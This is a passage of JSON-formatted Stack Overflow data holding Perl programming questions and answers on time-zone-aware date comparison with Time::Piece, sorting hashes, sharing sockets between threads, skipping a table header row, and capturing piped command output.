\"$h{$key}\\n\";\n}\n</code></pre>\n\n<p>But it did not work. How do I do this?</p>\n\n<p><strong>Update:</strong>\nJust came up with a solution:</p>\n\n<pre><code>my @keys = sort{substr($h{$a},3,8) &lt;=&gt; substr($h{$b},3,8) } keys %h;\nprint \"$_\\n\" for @keys;\n</code></pre>\n\n<p>But, how can make it more generic?</p>\n"}, {"tags": ["perl", "date", "time", "comparison"], "comments": [{"owner": {"reputation": 498, "user_id": 2174359, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/cf06579ee8856206e0dc3d83f9bb5c43?s=128&d=identicon&r=PG", "display_name": "FrankTheTank_12345", "link": "https://stackoverflow.com/users/2174359/frankthetank-12345"}, "edited": false, "score": 0, "creation_date": 1496393135, "post_id": 44324412, "comment_id": 75653769, "body": "I would suggest you to compare unixtimestamps."}, {"owner": {"reputation": 11905, "user_id": 2897372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9e114bd942d7cc21603ae50d2e73d81?s=128&d=identicon&r=PG", "display_name": "B\u0142otosm\u0119tek", "link": "https://stackoverflow.com/users/2897372/b%c5%82otosm%c4%99tek"}, "edited": false, "score": 0, "creation_date": 1496393697, "post_id": 44324412, "comment_id": 75654121, "body": "You use <code>$lCurrentTime</code> in both conditions, what you probably wanted is <code>$l15MinsAGo</code>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 498, "user_id": 2174359, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/cf06579ee8856206e0dc3d83f9bb5c43?s=128&d=identicon&r=PG", "display_name": "FrankTheTank_12345", "link": "https://stackoverflow.com/users/2174359/frankthetank-12345"}, "edited": false, "score": 3, "creation_date": 1496394174, "post_id": 44324412, "comment_id": 75654419, "body": "@Patrick85: There&#39;s no reason to do that. The <code>Time::Piece</code> module overloads <code>&lt;=&gt;</code> to compare the epoch value of both date-times, so just <code>&lt;</code> is fine."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1496395613, "post_id": 44324412, "comment_id": 75655270, "body": "Crucial piece of information missing. What is in <code>$opt_effdat</code>?"}], "answers": [{"comments": [{"owner": {"reputation": 19, "user_id": 4591566, "user_type": "registered", "profile_image": "https://graph.facebook.com/568001613/picture?type=large", "display_name": "vlatkovr", "link": "https://stackoverflow.com/users/4591566/vlatkovr"}, "edited": false, "score": 0, "creation_date": 1496395473, "post_id": 44324573, "comment_id": 75655189, "body": "Yes the issue seems to be the timezone. Your code prints:      1496394360     1496395335     0     7200  Hence 2 hours difference in the timezones. How do I fix this i.e. make the strptime use the same timezone?"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 19, "user_id": 4591566, "user_type": "registered", "profile_image": "https://graph.facebook.com/568001613/picture?type=large", "display_name": "vlatkovr", "link": "https://stackoverflow.com/users/4591566/vlatkovr"}, "edited": false, "score": 0, "creation_date": 1496396728, "post_id": 44324573, "comment_id": 75655897, "body": "I&#39;ve updated with some possible answers. Depends how important preserving TZ information is to you. But the simple answer would be - use <code>gmtime</code>."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1496396981, "post_id": 44324573, "comment_id": 75656050, "body": "@Sobrique: The best way: call <code>$lCurrentTime-&gt;strptime</code> instead of <code>Time::Piece-&gt;strptime</code> to create a date-time with the same time zone and daylight savings. See my answer."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 2, "last_activity_date": 1496396688, "last_edit_date": 1496396688, "creation_date": 1496393216, "answer_id": 44324573, "question_id": 44324412, "link": "https://stackoverflow.com/questions/44324412/perl-date-comparison-doesnt-work/44324573#44324573", "title": "Perl date comparison doesn&#39;t work", "body": "<p>What timezone are you in? </p>\n\n<p>This may enlighten you as to what is happening:</p>\n\n<pre><code>print $lEffDate -&gt; epoch,\"\\n\";\nprint $lCurrentTime -&gt; epoch,\"\\n\";\n\nprint $lEffDate -&gt; tzoffset,\"\\n\";\nprint $lCurrentTime -&gt; tzoffset,\"\\n\";\n</code></pre>\n\n<p>I suspect that (like me) the <code>strptime</code> date is zero offset, and the one you got from <code>new</code> is your timezone.</p>\n\n<p>So there's a couple of hours different in the actual timestamps. </p>\n\n<p>To correct this - there's a few different approaches:</p>\n\n<ul>\n<li>Parse a timezone into your string, using <code>%Z</code> or <code>%z</code>. </li>\n<li>Adjust the time by the timezone <code>$time += $time-&gt;localtime-&gt;tzoffset;</code></li>\n<li>Just work in 'UTC' - <code>strptime</code> is assuming it. So you can instead do <code>$lCurrentTime = gmtime;</code> I think. </li>\n</ul>\n"}, {"comments": [{"owner": {"reputation": 19, "user_id": 4591566, "user_type": "registered", "profile_image": "https://graph.facebook.com/568001613/picture?type=large", "display_name": "vlatkovr", "link": "https://stackoverflow.com/users/4591566/vlatkovr"}, "edited": false, "score": 1, "creation_date": 1496397333, "post_id": 44325831, "comment_id": 75656276, "body": "&quot;You can parse a date in the same time zone as the local one by calling strptime on $lCurrentTime instead of on the class name Time::Piece&quot;  This is what I needed and didn&#39;t know. Thx a lot."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 19, "user_id": 4591566, "user_type": "registered", "profile_image": "https://graph.facebook.com/568001613/picture?type=large", "display_name": "vlatkovr", "link": "https://stackoverflow.com/users/4591566/vlatkovr"}, "edited": false, "score": 0, "creation_date": 1496397625, "post_id": 44325831, "comment_id": 75656472, "body": "@vlatkovr: It&#39;s actually a bit messy because it produces an object that may have a different time zone and different daylight savings settings from the base object, but which together amount to the same offset."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 2, "last_activity_date": 1496396833, "creation_date": 1496396833, "answer_id": 44325831, "question_id": 44324412, "link": "https://stackoverflow.com/questions/44324412/perl-date-comparison-doesnt-work/44325831#44325831", "title": "Perl date comparison doesn&#39;t work", "body": "\n\n<p>There are several problems here:</p>\n\n<ul>\n<li><p>The test <code>lEffDate &lt; $lCurrentTime</code> should be <code>lEffDate &lt; $l15MinsAGo</code></p></li>\n<li><p>You are creating <code>$lEffDate</code> without a time zone, whereas <code>$lCurrentTime</code> is created with the local time zone, Daylight savings are current in effect, so the to are bound to differ</p></li>\n</ul>\n\n<p>Also</p>\n\n<ul>\n<li><p><code>Time::Piece</code> exports <code>localtime</code> which overrides the built-in operator. It functions in the same way both as the original call and as a <code>Time::Piece</code> object according to how it is used</p></li>\n<li><p>Please don't use <code>hungarianNotationAndCamelCase</code>. It's not very readable, expecially for those whose first language isn't English. Experienced Perl developers mostly use <code>snake_case</code>, and your leading <code>l</code> presumably means \"longword\", which is irrelevant on Perl</p></li>\n</ul>\n\n<p>You can parse a date in the same time zone as the local one by calling <code>strptime</code> on <code>$lCurrentTime</code> instead of on the class name <code>Time::Piece</code></p>\n\n<p>Like this</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings 'all';\n\nuse Time::Piece;\nuse Time::Seconds 'ONE_MINUTE';\n\nmy $opt_eff_date = '02-06-2017 10:00:00';\n\nmy $now         = localtime;\nmy $past_15mins = $now - 15 * ONE_MINUTE;\nmy $eff_date    = $now-&gt;strptime( $opt_eff_date, '%d-%m-%Y %H:%M:%S' );\n\nprint &lt;&lt;END;\n\nnow         = $now\npast_15mins = $past_15mins\neff_date    = $eff_date\n\nEND\n\nif ( $eff_date &lt; $past_15mins ) {\n    print \"Effective date $eff_date is smaller than 15 mins ago $past_15mins\\n\";\n}\nelse {\n    print \"Effective date $eff_date is larger than 15 mins ago $past_15mins\\n\";\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>now         = Fri Jun  2 10:36:26 2017\npast_15mins = Fri Jun  2 10:21:26 2017\neff_date    = Fri Jun  2 10:00:00 2017\n\nEff date Fri Jun  2 10:00:00 2017 is smaller than 15 mins ago Fri Jun  2 10:21:26 2017\n</code></pre>\n"}], "owner": {"reputation": 19, "user_id": 4591566, "user_type": "registered", "profile_image": "https://graph.facebook.com/568001613/picture?type=large", "display_name": "vlatkovr", "link": "https://stackoverflow.com/users/4591566/vlatkovr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1496396833, "creation_date": 1496392656, "question_id": 44324412, "link": "https://stackoverflow.com/questions/44324412/perl-date-comparison-doesnt-work", "title": "Perl date comparison doesn&#39;t work", "body": "<p>I am trying to do some date comparison in Perl but seems it is not working as expected. What might I be doing wrong?</p>\n\n<pre><code>my $lCurrentTime = Time::Piece-&gt;new;\nmy $l15MinsAGo   = $lCurrentTime - 900;\nmy $lEffDate     = Time::Piece-&gt;strptime($opt_effdate, '%d-%m-%Y %H:%M:%S');\n\nprint(\"\\n lCurrentTime = $lCurrentTime     l15MinsAGo = $l15MinsAGo     lEffDate = $lEffDate\\n\");\n\nif ($lEffDate &lt; $lCurrentTime) {\n    print(\"Eff date $lEffDate is smaller than 15 mins ago $l15MinsAGo\\n\");\n} elsif ($lEffDate &gt;= $lCurrentTime) {\n    print(\"Eff date $lEffDate is larger than 15 mins ago $l15MinsAGo\\n\");\n}\n</code></pre>\n\n<p>This prints:</p>\n\n<pre><code>lCurrentTime = Fri Jun  2 10:32:53 2017     \nl15MinsAGo = Fri Jun  2 10:17:53 2017     \nlEffDate = Fri Jun  2 10:07:00 2017\n\nEff date Fri Jun  2 10:07:00 2017 is larger than 15 mins ago Fri Jun  2 10:17:53 2017\n</code></pre>\n\n<p>Any ideas?</p>\n"}, {"tags": ["multithreading", "perl", "sockets"], "comments": [{"owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 1, "creation_date": 1496388446, "post_id": 44322329, "comment_id": 75651204, "body": "<a href=\"http://www.perlmonks.org/?node_id=473566\" rel=\"nofollow noreferrer\">perlmonks.org/?node_id=473566</a> <a href=\"https://stackoverflow.com/questions/26852180/shared-socket-object-among-perl-threads\" title=\"shared socket object among perl threads\">stackoverflow.com/questions/26852180/&hellip;</a>"}, {"owner": {"reputation": 4122, "user_id": 2869795, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/fMYyR.jpg?s=128&g=1", "display_name": "Kalanidhi", "link": "https://stackoverflow.com/users/2869795/kalanidhi"}, "reply_to_user": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1496638099, "post_id": 44322329, "comment_id": 75725334, "body": "Whether is it possible to share socket connection to the client ?  I want to share hast value to the thread but the hash value contain multiple client socket connection."}], "owner": {"reputation": 4122, "user_id": 2869795, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/fMYyR.jpg?s=128&g=1", "display_name": "Kalanidhi", "link": "https://stackoverflow.com/users/2869795/kalanidhi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 177, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1496393747, "creation_date": 1496385349, "last_edit_date": 1496393747, "question_id": 44322329, "link": "https://stackoverflow.com/questions/44322329/how-to-share-socket-hash-to-thread-function-in-perl", "title": "How to share socket hash to thread function in perl?", "body": "<p>I have tried to share hash value to thread function. The hash values contain soket connection , But I didn't share the hash variable to thread function. I am getting <code>Invalid value for shared scalar</code> error. But when I assign normal text or integer values to the hash , that time the hash variable  able to share to thread function. Can any one please solve the problem ? Below code I have tried </p>\n\n<pre><code>use strict;\nuse Data::Dumper;\nuse IO::Socket;\nuse IO::Select;\nuse JSON ;\nuse threads;\nuse threads::shared;\n\nmy  $i=5 ;\nmy  ($Main_Socket_Hash,$Read_Client );\n$|=1;\n\n\n\n\nprint \"Calling\" ;\n\nmy ($Chat_Details ) ;\n\n($main::Server,$main::Port)=(\"192.168.12.37\",\"6666\");\n\n\n$main::Socket= IO::Socket::INET-&gt;new(\n        'LocalAddr' =&gt;  $main::Server,\n        'LocalPort' =&gt;  $main::Port,\n        'Proto'     =&gt;  'tcp',\n        'Listen'    =&gt;  '120' ,\n        'Reuse'     =&gt;  1\n        ) ;\n\nHandle_Client() ;\n\nsub Handle_Client {\n\n    my ( $New_Socket,$New_Client,@Ready_Clints,$Thread_Id )   ;\n\n\n    share($i) ;\n    shared($Main_Socket_Hash) ;\n    $Thread_Id=threads-&gt;create(\\&amp;Read_Outgoing_Message);\n\n    $Read_Client = new IO::Select() ;\n    $Read_Client-&gt;add($main::Socket) ;\n\n\n    while ( 1 )  {\n\n        print \"Main loop \\n\" ;\n        my ($Read_Sockets) = IO::Select-&gt;select($Read_Client, undef, undef, 0);\n        foreach $New_Socket (@$Read_Sockets) {\n            Process_Request($New_Socket) ;\n        }\n        sleep(1);\n        $i=$i+5 ;\n\n    }\n\n}\n\n\nsub Process_Request {\n    my (  $New_Socket,$New_Client,$Request_Api ) =@_ ;\n\n    if ( $New_Socket eq $main::Socket ) { \n        $New_Client=$New_Socket-&gt;accept();\n        $Read_Client-&gt;add($New_Client ) ;\n    }\n    else {\n        $Request_Api=&lt;$New_Socket&gt; ;\n\n        unless ( $Request_Api ) { \n            $Read_Client-&gt;remove($New_Socket) ;\n            close($New_Socket) \n        }\n        else {\n            chomp($Request_Api );\n            Validation_Request_Api($New_Socket,$Request_Api)  ;\n\n        }\n\n    }\n\n}\n\n\nsub  Validation_Request_Api {\n\n    my ( $New_Socket, $Request_Api ,$Request_Data ) = @_ ;\n\n    $Request_Data=decode_json($Request_Api) ;\n    unless ( $Request_Data )\n    {\n        return \"FAILURE\" ;\n    }\n    unless ( $Main_Socket_Hash-&gt;{$Request_Data-&gt;{'chatId'}} )\n    {\n        $Main_Socket_Hash-&gt;{$Request_Data-&gt;{'chatId'}}=$New_Socket; \n        #$Main_Socket_Hash-&gt;{$Request_Data-&gt;{'chatId'}}=$Request_Data-&gt;{'chatId'}; \n    }\n\n    return \"SUCCESS\" ;\n}\nsub Read_Outgoing_Message {\n\n\n    my ( $Status,$Outgoing_Message )  ;\n\n    while ( 1 )  {\n        print \"%%%%%%%%%%%%%%%%%%%===&gt; $i &lt;=====%%%%%%%%%%%%%\\n\" ;\n        print \"%%%%%%%%%%%%%%%%%%%===&gt; \" . Dumper ( $Main_Socket_Hash) .\"  &lt;=====%%%%%%%%%%%%%\\n\" ;\n        sleep ( 1) ;\n\n    }\n}\n</code></pre>\n\n<p><strong>Note :</strong>\nWhen I get error  while assigning socket connection to hash value \n<br></p>\n\n<pre><code> $Main_Socket_Hash-&gt;{$Request_Data-&gt;{'chatId'}}=$New_Socket; \n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 2450, "user_id": 3940126, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0222b0a3b16a79649265eabba7e05add?s=128&d=identicon&r=PG&f=1", "display_name": "slowjack2k", "link": "https://stackoverflow.com/users/3940126/slowjack2k"}, "edited": false, "score": 0, "creation_date": 1496377189, "post_id": 44320628, "comment_id": 75646520, "body": "You did already split your line and stored it into <code>array1</code>. This variable is your row."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1496377297, "post_id": 44320628, "comment_id": 75646556, "body": "No need for the second <code>split</code> line. No need to quote variables, use <code>$line</code> and <code>$array1[0]</code>.  A good way to <code>split</code> on spaces is <code>split &#39; &#39;, $line;</code> where <code>&#39; &#39;</code> is a special pattern for <a href=\"https://perldoc.perl.org/functions/split.html\" rel=\"nofollow noreferrer\">split</a> (read the linked documentation page). Use the three-argument <code>open</code> (directly better), like so <code>open my $fh, &#39;&lt;&#39;, $file or die &quot;Can&#39;t open $file: $!&quot;;</code>"}], "answers": [{"tags": [], "owner": {"reputation": 84959, "user_id": 390913, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/87a2a7e9ea54bcd1a6c8f09f8c2e8f3b?s=128&d=identicon&r=PG", "display_name": "perreal", "link": "https://stackoverflow.com/users/390913/perreal"}, "is_accepted": false, "score": 1, "last_activity_date": 1496377613, "last_edit_date": 1496377613, "creation_date": 1496377337, "answer_id": 44320737, "question_id": 44320628, "link": "https://stackoverflow.com/questions/44320628/perl-printing-the-rows-beyond-the-first-in-a-table/44320737#44320737", "title": "Perl printing the rows beyond the first in a table", "body": "<p>One of these lines is redundant:</p>\n\n<pre><code>my @array1 = split(/\\s+/, \"$line\");\nmy @row=split(/\\s+/, \"$array1[0]\");\n</code></pre>\n\n<p>this works as desired:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nmy $file=$ARGV[0];\nmy @array;\nmy $line;\nmy $row;\n\n@array = &lt;DATA&gt;;\nmy $isContent = 0;\nforeach $line (@array)\n{\n    my @row = split(/\\s+/, $line);\n    next if not @row;\n    next if not $isContent++;\n    print \"$row[0]\\n\";\n}   \n\n__DATA__\n\nName        Age\nSteven      18\nJoe         19\nPeter       20\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "is_accepted": false, "score": 4, "last_activity_date": 1496378405, "last_edit_date": 1496378405, "creation_date": 1496377788, "answer_id": 44320824, "question_id": 44320628, "link": "https://stackoverflow.com/questions/44320628/perl-printing-the-rows-beyond-the-first-in-a-table/44320824#44320824", "title": "Perl printing the rows beyond the first in a table", "body": "<p>Here's the <a href=\"http://modernperlbooks.com/\" rel=\"noreferrer\">Modern Perl</a> way to do that:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse 5.010;\n\nwhile (&lt;DATA&gt;) {\n    next if $. == 1;\n    my ($name, $age) = split;\n    say $name;\n}\n\n__DATA__\nName        Age\nSteven      18\nJoe         19\nPeter       20\n</code></pre>\n\n<p>Notes:</p>\n\n<ul>\n<li>You generally want to avoid reading an entire file into memory if you can avoid it, and in this case, you can avoid it.</li>\n<li>We skip over the header row by using <code>$.</code>, which is <a href=\"http://perldoc.perl.org/perlvar.html#%24.\" rel=\"noreferrer\">the current line number for the last filehandle accessed</a>.</li>\n<li>When arguments to <a href=\"http://perldoc.perl.org/functions/split.html\" rel=\"noreferrer\"><code>split</code></a> are omitted, it acts on <code>$_</code> and splits on <code>' '</code>, which removes leading whitespace before splitting and treats the pattern as <code>/\\s+/</code>.</li>\n<li><a href=\"http://perldoc.perl.org/functions/say.html\" rel=\"noreferrer\"><code>say</code></a> is just like <code>print</code>, except that it implicitly appends a newline. It's automatically enabled with a <code>use 5.010</code> or higher.</li>\n</ul>\n"}], "owner": {"reputation": 1, "user_id": 8100984, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85fcaf593fad0071481ec014e199430a?s=128&d=identicon&r=PG&f=1", "display_name": "Dean Lee", "link": "https://stackoverflow.com/users/8100984/dean-lee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 56, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1496378405, "creation_date": 1496376580, "last_edit_date": 1496377091, "question_id": 44320628, "link": "https://stackoverflow.com/questions/44320628/perl-printing-the-rows-beyond-the-first-in-a-table", "title": "Perl printing the rows beyond the first in a table", "body": "<p>Im currently new to perl....</p>\n\n<p>So I have a table:</p>\n\n<pre>\nName        Age    \nSteven      18\nJoe         19\nPeter       20\n</pre>\n\n<p>and I want my script to print out the rows under 'Name' in the first column\nso it will look like this when i run the script:</p>\n\n<pre>\nSteven    \nJoe\nPeter\n</pre>\n\n<p>my script looks like this atm:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;  \nuse warnings;\n\nmy $file=$ARGV[0];\n\nmy @array;\nmy $line;\nmy $row;\n\nopen (File, \"&lt; $file\") or die \"Input file: $!\";\n\n@array = &lt;File&gt;;\n\nforeach $line (@array)\n{\n    my @array1 = split(/\\s+/, \"$line\");\n    my @row=split(/\\s+/, \"$array1[0]\");\n\n    print $row[1];\n}    \n</code></pre>\n\n<p>when i run it i cant seem to print out the string 'Steven' from my array.\ncan I have some guidance?</p>\n"}, {"tags": ["perl", "pipe", "backticks"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 3, "creation_date": 1496374492, "post_id": 44319945, "comment_id": 75645858, "body": "If you want to both send data to a program and read data from a program, you want <a href=\"http://search.cpan.org/perldoc?IPC::Run3\" rel=\"nofollow noreferrer\">IPC::Run3</a> or <a href=\"http://search.cpan.org/perldoc?IPC::Run\" rel=\"nofollow noreferrer\">IPC::Run</a>. Of course, it&#39;s less complicated to find the min and max in Perl!"}, {"owner": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 1, "creation_date": 1496381206, "post_id": 44319945, "comment_id": 75647770, "body": "I would use <code>use Capture::Tiny &#39;capture&#39;;</code> module for this requirement, If you just want to capture the output of linux command."}, {"owner": {"reputation": 19, "user_id": 8100778, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/7198a4b3447b0bab65304407a88a2e9a?s=128&d=identicon&r=PG&f=1", "display_name": "mlin", "link": "https://stackoverflow.com/users/8100778/mlin"}, "edited": false, "score": 0, "creation_date": 1496387200, "post_id": 44319945, "comment_id": 75650536, "body": "thanks a lot, maybe use min max twice separately is more easily"}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496420301, "post_id": 44332282, "comment_id": 75670500, "body": "I agree except for #2. Doing it yourself would requires a couple of hundred lines. Remember, <code>select</code> would need to be used."}], "tags": [], "owner": {"reputation": 19969, "user_id": 23512, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/tUj1I.png?s=128&g=1", "display_name": "Tanktalus", "link": "https://stackoverflow.com/users/23512/tanktalus"}, "is_accepted": false, "score": 2, "last_activity_date": 1496416649, "creation_date": 1496416649, "answer_id": 44332282, "question_id": 44319945, "link": "https://stackoverflow.com/questions/44319945/how-can-i-open-a-program-by-pipe-and-store-the-output-into-a-variable-in-perl/44332282#44332282", "title": "How can I open a program by pipe and store the output into a variable in Perl?", "body": "<p>There are many ways to pull this off.</p>\n\n<ol>\n<li>Use a module.</li>\n</ol>\n\n<p>There are many modules that can handle piping for you in a way that is much simpler than doing it yourself.  <a href=\"https://metacpan.org/pod/IPC::Run\" rel=\"nofollow noreferrer\">IPC::Run</a>, <a href=\"https://metacpan.org/pod/IPC::Run3\" rel=\"nofollow noreferrer\">IPC::Run3</a>, or, my current favourite, <a href=\"https://metacpan.org/pod/AnyEvent::Util\" rel=\"nofollow noreferrer\">AnyEvent::Util</a>::run_cmd.  This is just the tiniest of sampling - look around in CPAN, I'm sure you'll find dozens more.  Some of these can direct output into scalars, some also allow you to handle the input as it comes in, which can be advantageous when you receive a lot of input possibly over a long period of time, and can filter it on the way through to only extract the portions of data you're interested in.</p>\n\n<ol start=\"2\">\n<li>Use <a href=\"https://metacpan.org/pod/perlfunc#pipe-READHANDLE,WRITEHANDLE\" rel=\"nofollow noreferrer\">pipe</a> yourself.</li>\n</ol>\n\n<p>This is what some of the modules do.  Create a pair of bidirectional pipes, fork, close off the ends of the pipes you don't need in their respective processes, hook up the right pipes to your stdout and stdin, and exec the child process.  It's tricky to get it all right, thus the reason for the modules.</p>\n\n<ol start=\"3\">\n<li>Find the min and max yourself.</li>\n</ol>\n\n<p>You have the data in your process space already (or you have the file), just read it in to a pair of arrays, and call <a href=\"https://metacpan.org/pod/List::Util#min\" rel=\"nofollow noreferrer\">List::Util::min</a> and <a href=\"https://metacpan.org/pod/List::Util#max\" rel=\"nofollow noreferrer\">List::Util::max</a> on the arrays.  (I'm assuming they're simple numbers - if they're complex in some form, you may have to implement your own min/max.)</p>\n\n<ol start=\"4\">\n<li>Treat data as data.</li>\n</ol>\n\n<p>If your data is structured, one of my favourites is to simply feed it in to <a href=\"https://metacpan.org/pod/DBD::CSV\" rel=\"nofollow noreferrer\">DBD::CSV</a> and then I can execute SQL on it - you can even feed your data directly from in memory if that's what you have.  It's a bit slower at runtime, but can do some pretty useful things.  This also is a good segue into putting the data into a real (or real-ish) database, whether that's SQLite as an intermediate (this is never my ultimate plan, but it makes a great dev tool or proof-of-concept that may turn out to be viable for years), or mySQL, postgres, DB2, Oracle, whatever, especially if your data set continues to grow.</p>\n"}], "owner": {"reputation": 19, "user_id": 8100778, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/7198a4b3447b0bab65304407a88a2e9a?s=128&d=identicon&r=PG&f=1", "display_name": "mlin", "link": "https://stackoverflow.com/users/8100778/mlin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 205, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1496416649, "creation_date": 1496370973, "last_edit_date": 1496373253, "question_id": 44319945, "link": "https://stackoverflow.com/questions/44319945/how-can-i-open-a-program-by-pipe-and-store-the-output-into-a-variable-in-perl", "title": "How can I open a program by pipe and store the output into a variable in Perl?", "body": "<p>I have two cols of data. How can I get the min and max values of each column?</p>\n\n<p>I'm trying something like:</p>\n\n<pre><code>open $in, \"|gmt minmax -C\";\nprint $in ...;\n...\nclose($in);\n</code></pre>\n\n<p>However, the output will be printed to the screen. How can I store the results in @minmax(with backticks?)</p>\n"}, {"tags": ["linux", "macos", "perl", "stdin", "macos-sierra"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1496374859, "post_id": 44319436, "comment_id": 75645936, "body": "There is no inherent limit to how long a string may be (nothing on this side of crazy anyway).  At certain point some things may stop working but there is absolutely no way that a user can enter those tens of thousands of characters. It&#39;s something else that the program does, so can you show us the code that actually causes the problem?  Btw, you should remove the newline after input is read, <code>chomp $line;</code> (right after <code>while</code>)."}, {"owner": {"reputation": 53, "user_id": 7630721, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/00e5ba6fd4d23085863255d99d9700a2?s=128&d=identicon&r=PG&f=1", "display_name": "Joe", "link": "https://stackoverflow.com/users/7630721/joe"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1496436726, "post_id": 44319436, "comment_id": 75678418, "body": "As you said, perl probably does not have such a limit, but Mac OS may."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": 